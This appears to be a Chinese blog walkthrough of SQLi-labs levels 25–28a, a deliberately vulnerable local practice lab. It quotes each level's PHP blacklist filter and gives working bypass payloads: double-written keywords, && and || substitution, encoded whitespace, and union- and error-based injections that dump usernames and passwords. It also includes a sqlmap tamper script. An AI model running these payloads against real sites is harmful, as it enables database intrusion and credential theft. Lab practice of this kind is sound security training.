---
 title: Sqlilabs通关笔记(25-28)绕过注入
 date: 2020-01-07 16:58:27
 tags: SQL注入
 categories: SQL注入
---


## 第二十五关 基于错误的GET单引号-你的OR及AND归我所有
这个系列是绕过注入，题目已提示需要绕过的字符，且能显示出输入的payload

![2020-1-8-12-25-30](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-8-12-25-30)

### 源码审计
```php
function blacklist($id)
{
	$id= preg_replace('/or/i',"", $id);			//strip out OR (non case sensitive)
	$id= preg_replace('/AND/i',"", $id);		//Strip out AND (non case sensitive)
	
	return $id;
}
```
**从代码可以看出是吧or和and忽略大小正则替换成空**
<!--more-->

### 绕过方式

* 符号替换绕过
    **数学符号**
    > and = && or = ||
    &对应url编码%26,|对应url编码%7

    **payload**:
    > http://127.0.0.1/sqlilabs2/Less-25/?id=1' || extractvalue(null,concat(0x7e,database(),0x7e))%23

* 双写绕过
    > oorr # 替换为空仍为or
    anandd # 替换为空仍为and
    
    **payload**:
    > http://127.0.0.1/sqlilabs2/Less-25/?id=1' oorr extractvalue(null,concat(0x7e,database(),0x7e))%23

* 注释绕过
    > and = an/\*\*/d    or = o/\*\*/r

    **payload**:
    > http://127.0.0.1/sqlilabs2/Less-25/?id=1' oorr extractvalue(null,concat(0x7e,database(),0x7e))%23

### SQLMAP编写tamper绕过
```python
#!/usr/bin/env python

"""
Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import re

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def tamper(payload, **kwargs):
    """
    Add an inline comment (/**/) to the end of all occurrences of (MySQL) "information_schema" identifier

    >>> tamper('and or')
    'anandd oorr'
    """

    retVal = payload

    if payload:
        retVal = re.sub(r"(?i)(and)", r"anandd", re.sub(r"(?i)(or)", "oorr", payload))

    return retVal
```
1. 另存为xx.py
2. 使用sqlmap调用该tamper
> sqlmap -u "http://127.0.0.1/sqlilabs2/Less-25/?id=1" --tamper "xx.py" --technique E --threads 10 --dbs --batch

## 第二十五a关 基于GET盲注整型单引号-你的OR及AND归我所有

### 源码审计
```php
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

	if($row)
	{
  		echo "<font size='5' color= '#99FF00'>";	
	  	echo 'Your Login name:'. $row['username'];
		//echo 'YOU ARE IN ........';	  	
		echo "<br>";
	  	echo 'Your Password:' .$row['password'];
	  	echo "</font>";
  	}
	else 
	{
		echo '<font size="5" color="#FFFF00">';
		//echo 'You are in...........';
		//print_r(mysql_error());
		//echo "You have an error in your SQL syntax";
		echo "</br></font>";	
		echo '<font color= "#0000ff" font size= 3>';	
	
	}
}
	else 
{ 
	echo "Please input the ID as parameter with numeric value";
}

function blacklist($id)
{
	$id= preg_replace('/or/i',"", $id);			//strip out OR (non case sensitive)
	$id= preg_replace('/AND/i',"", $id);		//Strip out AND (non case sensitive)
	
	return $id;
}
```

1. 源码和上一关类似，过滤机制一样
2. 不同的是整形闭合
3. 不会输出错误信息了，所以不能进行报错注入了
4. 直接上payload

> http://127.0.0.1/sqlilabs2/Less-25a/?id=-1 union select 1,(select group_concat(username,passwoorrd) from users) ,3--+

![2020-1-8-13-55-1](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-8-13-55-1)

## 第二十六关 基于GET错误-你的空格和注释归我所有

### 源码审计
```php
function blacklist($id)
{
	$id= preg_replace('/or/i',"", $id);			//strip out OR (non case sensitive)
	$id= preg_replace('/and/i',"", $id);		//Strip out AND (non case sensitive)
	$id= preg_replace('/[\/\*]/',"", $id);		//strip out /*
	$id= preg_replace('/[--]/',"", $id);		//Strip out --
	$id= preg_replace('/[#]/',"", $id);			//Strip out #
	$id= preg_replace('/[\s]/',"", $id);		//Strip out spaces
	$id= preg_replace('/[\/\\\\]/',"", $id);		//Strip out slashes
	return $id;
}
```
1. 从源码看除了过滤or和and外还过滤了#和--
2. 还有斜杠和*号和空格

### 绕过方式

* **编码绕过**

    - %09 TAB键（空格）
    - %0A 新建一行（空格）
    - %0C 新的一页
    - %0D return即回车功能 （php-5.2.17,5.3.29成功）
    - %0B TAB键（垂直）
    - %A0 空格 （php-5.2.17成功）

* **括号绕过**

    - 用()绕过,意思就是不使用任何空格

**payload:**
> http://127.0.0.1/sqlilabs2/Less-26/?id=1'%26%26extractvalue(null,concat(0x7e,(select(group_concat(username,'~',passwoorrd))from(security.users)),0x7e))%7c%7c'1

![2020-1-8-18-35-9](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-8-18-35-9)

## 第二十六a关 基于GET错误-你的空格和注释归我所有-字符型-括号

### 源码审计

1. 和上一关绕过方式一样，只是不能使用报错注入了
2. 需要通过括号进行闭合

### 绕过方式
**payload**
> http://127.0.0.1/sqlilabs2/Less-26a/??id=1111')union%A0select(1),(select(group_concat(id,'~',username,'~',passwoorrd))from(security.users)),3%7c%7c('1


## 第二十七关 基于GET错误-你的UNION和SELECT归我所有-字符型单引号

### 源码审计

```php
function blacklist($id)
{
$id= preg_replace('/[\/\*]/',"", $id);		//strip out /*
$id= preg_replace('/[--]/',"", $id);		//Strip out --.
$id= preg_replace('/[#]/',"", $id);			//Strip out #.
$id= preg_replace('/[ +]/',"", $id);	    //Strip out spaces.
$id= preg_replace('/select/m',"", $id);	    //Strip out spaces.
$id= preg_replace('/[ +]/',"", $id);	    //Strip out spaces.
$id= preg_replace('/union/s',"", $id);	    //Strip out union
$id= preg_replace('/select/s',"", $id);	    //Strip out select
$id= preg_replace('/UNION/s',"", $id);	    //Strip out UNION
$id= preg_replace('/SELECT/s',"", $id);	    //Strip out SELECT
$id= preg_replace('/Union/s',"", $id);	    //Strip out Union
$id= preg_replace('/Select/s',"", $id);	    //Strip out select
return $id;
}
```
1. 从源码可知过滤了union和select,并非大小写忽略的那种
2. *和--也被过滤了
3. 会打印出错误信息，可以使用报错注入

### 绕过方式

* 双写绕过

> uniunionon   selecselectt

* 大小写绕过

> select ->  SeLect   union -> UNion

**payload**
> http://127.0.0.1/sqlilabs2/Less-27/?id=1'%09and%09updatexml(1,concat(0x7e,(SeleCt(group_concat(username,password))from(users)),0x7e),1)and'1

![2020-1-9-10-39-44](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-9-10-39-44)

## 第二十七a关 基于GET错误-你的UNION和SELECT归我所有-双引号

### 源码审计
1. 绕过方式一样，双引号闭合
2. 不输出报错信息，不能使用报错注入

**payload**
> http://127.0.0.1/sqlilabs2/Less-27a/?id=1"%09and%091=2%09%09uniunionon%09SElselectect%091,(SElect(group_concat(username,password))from(users)),3%09or%09"1

## 第二十八关 基于GET错误-你的UNION和SELECT归我所有-字符型单引号和括号

### 源码审计
```php
// connectivity 
	$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
	$result=mysql_query($sql);
	$row = mysql_fetch_array($result);
	if($row)
	{
	  	echo "<font size='5' color= '#99FF00'>";	
	  	echo 'Your Login name:'. $row['username'];
	  	echo "<br>";
	  	echo 'Your Password:' .$row['password'];
	  	echo "</font>";
  	}
	else 
	{
		echo '<font color= "#FFFF00">';
		//print_r(mysql_error());
		echo "</font>";  
	}
}
	else { echo "Please input the ID as parameter with numeric value";}




function blacklist($id)
{
$id= preg_replace('/[\/\*]/',"", $id);				//strip out /*
$id= preg_replace('/[--]/',"", $id);				//Strip out --.
$id= preg_replace('/[#]/',"", $id);					//Strip out #.
$id= preg_replace('/[ +]/',"", $id);	    		//Strip out spaces.
//$id= preg_replace('/select/m',"", $id);	   		 	//Strip out spaces.
$id= preg_replace('/[ +]/',"", $id);	    		//Strip out spaces.
$id= preg_replace('/union\s+select/i',"", $id);	    //Strip out UNION & SELECT.
return $id;
}
```
1. 通过源码分析，过滤了union select 忽略大小写
2. 过滤了#和注释、空格

### 绕过方式

* 双写绕过

> union

* 加字符绕过

> union all select

**直接上payload**

> http://127.0.0.1/sqlilabs2/Less-28/?id=1')%0aand%0a1=2%0aunion%0aall%0aselect%0a1,database(),3%0aor ('1

## 第二十八a关 基于GET盲注-你的UNION和SELECT归我所有-字符型单引号和括号

和上一关类似

![2020-1-9-11-23-10](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-9-11-23-10)